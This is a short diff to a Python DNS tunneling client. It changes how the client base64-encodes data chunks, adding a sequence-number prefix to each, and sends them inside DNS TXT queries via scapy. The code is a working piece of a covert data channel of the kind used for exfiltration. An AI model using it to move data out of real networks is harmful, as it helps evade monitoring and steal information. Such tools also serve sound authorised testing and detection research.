@@ -62,7 +62,9 @@ class Client:
         while byte_reader < len(data_to_transmit):
             if not self.file_transfer:
                 try:
-                    encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+                    chunk = data_to_transmit[byte_reader:byte_reader + self.length]
+                    seq_prefix = f'{packet_number:04d}'.encode()
+                    encoded_data = seq_prefix + base64.b64encode(chunk)
                     send(IP(dst=final_destination)/UDP()/DNS(
                            id=15, opcode=0, qd=[DNSQR(
                             qname=encoded_data, qtype="TXT")], aa=1, qr=0),
